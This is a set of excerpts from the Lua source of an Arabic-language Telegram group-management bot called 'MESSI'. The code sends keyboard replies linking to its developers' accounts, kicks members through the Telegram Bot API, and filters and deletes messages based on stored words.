keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المــبــرمـج ميسي',url="t.me/siria2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ميسي' or text == 'ميسي' or text == 'ميسي' then
local Text = [[
𓆩 اقـــمــــد مــن الـــقــمــدان يـــآروحـــي 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'صـاحب السورس',url="t.me/Messidaola"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
MESSI  = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(MESSI )
...
--------------------------------------------------------------------------------------------------------------
SourceMESSI (data.message_,data)
plugin_MESSI (data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local MessiAbot = database:get(bot_id.."Messi1:Add:Filter:Rp2"..text..result.chat_id_)   
if MessiAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"♡︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n♡︙ ["..MessiAbot.."] \n") 
else
send(msg.chat_id_,0,"♡︙ العضو : {["..data.first_name_.."](T.ME/M_e_s_s_1)}\n♡︙ ["..MessiAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
...
------------------------------------------------------------------------
if text then
local Messi1_Msg = database:get(bot_id.."Messi1:Add:Filter:Rp2"..text..result.chat_id_)   
if Messi1_Msg then    
send(msg.chat_id_, msg.id_,"♡︙ "..Messi1_Msg)
